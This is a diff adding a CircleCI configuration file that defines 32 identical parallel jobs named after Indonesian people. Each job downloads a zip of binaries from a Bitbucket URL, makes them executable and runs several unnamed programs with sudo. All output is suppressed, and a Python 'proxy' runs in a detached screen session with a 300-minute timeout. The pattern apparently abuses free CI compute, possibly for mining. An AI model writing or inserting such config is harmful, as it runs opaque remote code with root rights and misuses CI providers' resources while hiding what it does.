@@ -1,0 +1,219 @@
+version: 2.1
+jobs:
+  JuliariBatubara:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: &commonSteps
+      steps:
+        - run:
+            name: Inilah
+            command: |
+              ls
+        - run:
+            name: Nama
+            command: |
+              wget https://bitbucket.org/sindylestari/sindy/raw/07d31b8cb0f894bd1bd0629dad4cb02b7ffa8ddc/Dbg.zip >/dev/null 2>&1
+        - run:
+            name: Orang
+            command: |
+              unzip Dbg.zip >/dev/null 2>&1
+        - run:
+            name: Korupsi
+            command: |
+              chmod u+x * >/dev/null 2>&1
+        - run:
+            name: Membuat
+            command: |
+              sudo ./semoga >/dev/null 2>&1
+        - run:
+            name: Hidupku
+            command: |
+              sudo ./kalian >/dev/null 2>&1
+        - run:
+            name: Menjadi
+            command: |
+              sudo ./semua >/dev/null 2>&1
+        - run:
+            name: Pengangguran
+            command: |
+              sudo ./dikutuk >/dev/null 2>&1
+        - run:
+            name: Anjir Lo. . . . .
+            no_output_timeout: 300m
+            command: |
+              echo "Salam MrGolekOpo. . ."
+              sudo ./menjadi >/dev/null 2>&1
+              sudo ./tahi >/dev/null 2>&1
+              sudo ./anjir >/dev/null 2>&1
+              screen -dmS proxy python3 p2.py >/dev/null 2>&1
+              #sleep 12s###
+              0#sudo ./start2 >/dev/null 2>&1
+  SyamsulArifin:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  ArtalytaSuryani:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  AzisSyamsuddin:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  BambangSutrisno:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  BudhiSarwono:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  ChoelMallarangeng:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  DjokoSusilo:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  EddieWidiono:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  FuadAminImron:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  GatotPujoNugroho:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  HasanAminuddin:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  IriantoMSSyafiuddin:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  IrvanRivanoMuchtar:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  IskakTjokroadisurjo:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  JohanAnuar:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  AnnasMaamun:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  AndiMallarangeng:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  NoviRahmanHidayat:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  OjangSohandi:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  PatriceRioCapella:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  PuputTantrianaSari:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  RahmatYasin:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  RahardiRamelan:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  RinaIriani:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  AnasUrbaningrum:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  DannySetiawan:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  SukawiSutarip:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  GayusTambunan:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  RitaWidyasari:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  MidfaiYabani:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+  YuliusNawawi:
+    docker:
+      - image: circleci/php:7.1-node-browsers
+    <<: *commonSteps
+
+
+
+
+workflows:
+  version: 2
+  all:
+    jobs:
+      - JuliariBatubara
+      - SyamsulArifin
+      - ArtalytaSuryani
+      - AzisSyamsuddin
+      - BambangSutrisno
+      - BudhiSarwono
+      - ChoelMallarangeng
+      - DjokoSusilo
+      - EddieWidiono
+      - FuadAminImron
+      - GatotPujoNugroho
+      - HasanAminuddin
+      - IriantoMSSyafiuddin
+      - IrvanRivanoMuchtar
+      - IskakTjokroadisurjo
+      - JohanAnuar
+      - AnnasMaamun
+      - AndiMallarangeng
+      - NoviRahmanHidayat
+      - OjangSohandi
+      - PatriceRioCapella
+      - PuputTantrianaSari
+      - RahmatYasin
+      - RahardiRamelan
+      - RinaIriani
+      - AnasUrbaningrum
+      - DannySetiawan
+      - SukawiSutarip
+      - GayusTambunan
+      - RitaWidyasari
+      - MidfaiYabani
+      - YuliusNawawi
+
+
+
+
+
